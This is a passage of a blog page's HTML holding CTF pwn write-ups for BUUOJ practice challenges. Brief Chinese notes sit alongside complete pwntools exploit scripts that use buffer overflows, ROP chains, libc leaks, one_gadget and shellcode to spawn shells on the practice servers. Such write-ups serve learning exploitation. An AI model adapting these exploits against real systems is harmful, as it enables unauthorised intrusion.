class=\"line\"><span class=\"comment\">#p = process(\"./pwn3\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./LibC\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')</span></span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">encrypt = <span class=\"number\">0x4009a0</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c83</span></span><br><span class=\"line\">ret = <span class=\"number\">0x4006b9</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(encrypt)</span><br><span class=\"line\">sla(<span class=\"string\">\"Input your choice!\\n\"</span>,<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">ru(<span class=\"string\">\"Input your Plaintext to be encrypted\\n\"</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">rl()</span><br><span class=\"line\">rl()</span><br><span class=\"line\">puts = u64(ru(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">-1</span>].ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\x00'</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">print(libc)</span><br><span class=\"line\">libc_base = puts-libc.dump(<span class=\"string\">\"puts\"</span>)</span><br><span class=\"line\">log.info(<span class=\"string\">\"libc base 0x%x\"</span>,libc_base)</span><br><span class=\"line\"></span><br><span class=\"line\">system_addr = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">bin_sh_addr = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">payload2=<span class=\"string\">b'A'</span>*<span class=\"number\">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class=\"line\">sl(payload2)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-n-8\"><a href=\"#ciscn-2019-n-8\" class=\"headerlink\" title=\"ciscn_2019_n_8\"></a>ciscn_2019_n_8</h2><p>var[13] = ‘\\x11’</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class=\"line\"># -*- coding:utf-8 -*-</span><br><span class=\"line\">from pwn import *</span><br><span class=\"line\"></span><br><span class=\"line\">context.os&#x3D;&#39;linux&#39;</span><br><span class=\"line\">#context.log_level&#x3D;&#39;debug&#39;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">s       &#x3D; lambda data               :p.send(str(data))</span><br><span class=\"line\">sa      &#x3D; lambda delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      &#x3D; lambda data               :p.sendline(str(data))</span><br><span class=\"line\">sla     &#x3D; lambda delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       &#x3D; lambda num&#x3D;4096           :p.recv(num)</span><br><span class=\"line\">ru      &#x3D; lambda delims, drop&#x3D;True  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     &#x3D; lambda                    :p.interactive()</span><br><span class=\"line\">uu32    &#x3D; lambda data               :u32(data.ljust(4,&#39;\\0&#39;))</span><br><span class=\"line\">uu64    &#x3D; lambda data               :u64(data.ljust(8,&#39;\\0&#39;))</span><br><span class=\"line\">leak    &#x3D; lambda name,addr          :log.success(&#39;&#123;&#125; &#x3D; &#123;:#x&#125;&#39;.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,26219)</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*(0x04*13) + p64(17)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level2\"><a href=\"#jarvisoj-level2\" class=\"headerlink\" title=\"jarvisoj_level2\"></a>jarvisoj_level2</h2><p>sysytem和/bin/sh都有</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29272)</span><br><span class=\"line\">bin_sh &#x3D; 0x0804A024</span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;level2&quot;)</span><br><span class=\"line\">sys &#x3D; elf.plt[&quot;system&quot;]</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*(0x88+0x4) + p32(sys) + p32(0) + p32(bin_sh)</span><br><span class=\"line\">print(payload)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"not-the-same-3dsctf-2016（32位write调用）\"><a href=\"#not-the-same-3dsctf-2016（32位write调用）\" class=\"headerlink\" title=\"not_the_same_3dsctf_2016（32位write调用）\"></a>not_the_same_3dsctf_2016（32位write调用）</h2><p>把bss段上的flag直接通过write函数拿出来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29106)</span><br><span class=\"line\"></span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;pwn9&quot;)</span><br><span class=\"line\">bss&#x3D;0x080eca2d</span><br><span class=\"line\">payload&#x3D;&#39;a&#39;*(0x2d)+p32(0x80489a0)+p32(elf.sym[&#39;write&#39;])+p32(0)+p32(1)+p32(bss)+p32(45)</span><br><span class=\"line\">#print(payload)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"BJDCTF-2nd-one-gadget\"><a href=\"#BJDCTF-2nd-one-gadget\" class=\"headerlink\" title=\"[BJDCTF 2nd]one_gadget\"></a>[BJDCTF 2nd]one_gadget</h2><p>主要来熟悉一下这个东西</p>\n<p>one_gadget</p>\n<p>有libc基址直接就可以上one_gadget</p>\n<blockquote>\n<p>功能：查找已知的libc中exevce(“/bin/sh”)语句的地址<br>用法: one_gadget libc-x.xx.so</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29935)</span><br><span class=\"line\"></span><br><span class=\"line\">elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class=\"line\">libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class=\"line\">ru(&quot;here is the gift for u:&quot;)</span><br><span class=\"line\">printf &#x3D; int(ru(&#39;\\n&#39;)[2:],16)</span><br><span class=\"line\"></span><br><span class=\"line\">libcbase &#x3D; printf - libc.sym[&quot;printf&quot;]  </span><br><span class=\"line\">one_gadget &#x3D; 0x106ef8</span><br><span class=\"line\">leak(&quot;printf&quot;,libcbase)</span><br><span class=\"line\">sys &#x3D; libcbase + one_gadget</span><br><span class=\"line\">payload &#x3D; str(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-babystack\"><a href=\"#bjdctf-2020-babystack\" class=\"headerlink\" title=\"bjdctf_2020_babystack\"></a>bjdctf_2020_babystack</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27635)</span><br><span class=\"line\"></span><br><span class=\"line\">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class=\"line\">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class=\"line\">sl(32)</span><br><span class=\"line\">sys &#x3D; 0x4006E6</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x18 + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"HarekazeCTF2019-baby-rop\"><a href=\"#HarekazeCTF2019-baby-rop\" class=\"headerlink\" title=\"[HarekazeCTF2019]baby_rop\"></a>[HarekazeCTF2019]baby_rop</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,29338)</span><br><span class=\"line\"></span><br><span class=\"line\">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class=\"line\">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class=\"line\">sys &#x3D; 0x400490</span><br><span class=\"line\">bin_sh &#x3D; 0x601048</span><br><span class=\"line\">pop_rdi &#x3D; 0x400683</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x18 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"jarvisoj-level2-x64\"><a href=\"#jarvisoj-level2-x64\" class=\"headerlink\" title=\"jarvisoj_level2_x64\"></a>jarvisoj_level2_x64</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &#x3D; remote(&quot;node3.buuoj.cn&quot;,27323)</span><br><span class=\"line\"></span><br><span class=\"line\">#elf &#x3D; ELF(&quot;.&#x2F;one_gadget&quot;)</span><br><span class=\"line\">#libc &#x3D; ELF(&quot;.&#x2F;libc-2.291.so&quot;)</span><br><span class=\"line\">sys &#x3D; 0x4004C0</span><br><span class=\"line\">bin_sh &#x3D; 0x600A90</span><br><span class=\"line\">pop_rdi &#x3D; 0x4006b3</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x88 + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-n-5\"><a href=\"#ciscn-2019-n-5\" class=\"headerlink\" title=\"ciscn_2019_n_5\"></a>ciscn_2019_n_5</h2><blockquote>\n<p>写shellcode要注意不同架构下</p>\n<p>shellcode是不同的</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ret &#x3D; 0x4004c9</span><br><span class=\"line\">bss &#x3D; 0x601080</span><br><span class=\"line\">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class=\"line\">print(len(shellcode))</span><br><span class=\"line\">sla(&quot;tell me your name\\n&quot;,shellcode)</span><br><span class=\"line\">payload &#x3D; b&#39;A&#39;*0x28 + p64(bss)</span><br><span class=\"line\">sla(&quot;me?\\n&quot;,payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ciscn-2019-ne-5\"><a href=\"#ciscn-2019-ne-5\" class=\"headerlink\" title=\"ciscn_2019_ne_5\"></a>ciscn_2019_ne_5</h2><blockquote>\n<p>32位puts泄露</p>\n<p>但好像put的got表不可以泄露</p>\n<p>需要试一试其他的</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">29708</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(log)</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"0.Exit\\n:\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'1'</span>)</span><br><span class=\"line\">    ru(<span class=\"string\">\"Please input new log info:\"</span>)</span><br><span class=\"line\">    sl(log)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">display</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"0.Exit\\n:\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">'2'</span>)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">getflag</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    ru(<span class=\"string\">\"0.Exit\\n:\"</span>)</span><br><span class=\"line\">    sl(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn14\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\">sl(<span class=\"string\">\"administrator\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">printf_got = elf.got[<span class=\"string\">'printf'</span>]</span><br><span class=\"line\">main = <span class=\"number\">0x8048722</span></span><br><span class=\"line\">sys = <span class=\"number\">0x80484D0</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x48</span>+<span class=\"number\">0x4</span>) + p32(puts_plt) + p32(main) + p32(printf_got)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">getflag()</span><br><span class=\"line\">ru(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">printf = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">print(printf)</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"printf\"</span>,printf)</span><br><span class=\"line\">libc_base = printf - libc.dump(<span class=\"string\">\"printf\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"printf\"</span>,libc_base)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">sl(<span class=\"string\">\"administrator\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x48</span>+<span class=\"number\">0x4</span>) + p32(sys) + p32(<span class=\"number\">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class=\"line\">add(payload)</span><br><span class=\"line\">getflag()</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"铁人三项-第五赛区-2018-rop-32位write泄露\"><a href=\"#铁人三项-第五赛区-2018-rop-32位write泄露\" class=\"headerlink\" title=\"铁人三项(第五赛区)_2018_rop(32位write泄露)\"></a>铁人三项(第五赛区)_2018_rop(32位write泄露)</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27242</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn15\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">main = <span class=\"number\">0x80484C6</span></span><br><span class=\"line\">write_plt = elf.symbols[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">'write'</span>]</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>) + p32(write_plt) + p32(main) + p32(<span class=\"number\">0</span>) + p32(write_got) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">write = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"write\"</span>,write)</span><br><span class=\"line\">libc_base = write - libc.dump(<span class=\"string\">\"write\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"write\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x88</span>+<span class=\"number\">0x4</span>) + p32(sys) + p32(<span class=\"number\">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"bjdctf-2020-babyrop-64位puts泄露\"><a href=\"#bjdctf-2020-babyrop-64位puts泄露\" class=\"headerlink\" title=\"bjdctf_2020_babyrop(64位puts泄露)\"></a>bjdctf_2020_babyrop(64位puts泄露)</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27648</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn17\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\"></span><br><span class=\"line\">main = <span class=\"number\">0x4006AD</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400733</span></span><br><span class=\"line\">puts_plt = elf.symbols[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">0x8</span>) + p64(pop_rdi) +p64(puts_got)+ p64(puts_plt) + p64(main) </span><br><span class=\"line\"></span><br><span class=\"line\">sla(<span class=\"string\">\"Pull up your sword and tell me u story!\\n\"</span>,payload)</span><br><span class=\"line\">puts = uu64(ru(<span class=\"string\">'\\n'</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.dump(<span class=\"string\">\"puts\"</span>)</span><br><span class=\"line\">leak(<span class=\"string\">\"puts\"</span>,libc_base)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">\"system\"</span>)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">\"str_bin_sh\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"others-shellcode\"><a href=\"#others-shellcode\" class=\"headerlink\" title=\"others_shellcode\"></a>others_shellcode</h2><p>连上就有</p>\n<h2 id=\"pwn2-sctf-2016（32位printf泄露）\"><a href=\"#pwn2-sctf-2016（32位printf泄露）\" class=\"headerlink\" title=\"pwn2_sctf_2016（32位printf泄露）\"></a>pwn2_sctf_2016（32位printf泄露）</h2><blockquote>\n<p>好像prinf的got表打不通</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28222</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn19\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"/lib32/libc.so.6\")</span></span><br><span class=\"line\">vuln = <span class=\"number\">0x804852F</span></span><br><span class=\"line\">formats = <span class=\"number\">0x80486A8</span></span><br><span class=\"line\">printf_plt = elf.sym[<span class=\"string\">\"printf\"</span>]</span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">\"atoi\"</span>]</span><br><span class=\"line\">sl(<span class=\"number\">-1</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x2c</span>+<span class=\"number\">0x4</span>) + p32(printf_plt) + p32(vuln) + p32(atoi_got)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">ru(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">atoi = uu32(r(<span class=\"number\">4</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"atoi\"</span>,atoi)</span><br><span class=\"line\">libc_base = atoi - libc.dump(<span class=\"string\">'atoi'</span>)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">'system'</span>)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">'str_bin_sh'</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x2c</span>+<span class=\"number\">0x4</span>) + p32(sys) +p32(<span class=\"number\">0xdeadbeef</span>) + p32(bin_sh)</span><br><span class=\"line\">sl(<span class=\"number\">-1</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"HarekazeCTF2019-baby-rop2-64位printf泄露\"><a href=\"#HarekazeCTF2019-baby-rop2-64位printf泄露\" class=\"headerlink\" title=\"[HarekazeCTF2019]baby_rop2(64位printf泄露)\"></a>[HarekazeCTF2019]baby_rop2(64位printf泄露)</h2><blockquote>\n<p>经常会出现泄露printf的got表不行的情况</p>\n<p>尽量用其他的</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">28714</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./pwn21\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#libc = ELF(\"./libc-2.27.so\")</span></span><br><span class=\"line\">vuln = <span class=\"number\">0x400636</span></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400733</span></span><br><span class=\"line\">ret = <span class=\"number\">0x4004d1</span></span><br><span class=\"line\">printf_plt = elf.sym[<span class=\"string\">\"printf\"</span>]</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">\"read\"</span>]</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">0x8</span>) + p64(pop_rdi) + p64(read_got) + p64(printf_plt) + p64(vuln) </span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">'\\n'</span>)</span><br><span class=\"line\">read = uu64(ru(<span class=\"string\">\"What's\"</span>))</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">\"read\"</span>,read)</span><br><span class=\"line\">libc_base = read - libc.dump(<span class=\"string\">'read'</span>)</span><br><span class=\"line\">sys = libc_base + libc.dump(<span class=\"string\">'system'</span>)</span><br><span class=\"line\">bin_sh = libc_base + libc.dump(<span class=\"string\">'str_bin_sh'</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*(<span class=\"number\">0x20</span>+<span class=\"number\">0x8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(sys)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"ez-pz-hackover-2016\"><a href=\"#ez-pz-hackover-2016\" class=\"headerlink\" title=\"ez_pz_hackover_2016\"></a>ez_pz_hackover_2016</h2><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = remote(<span 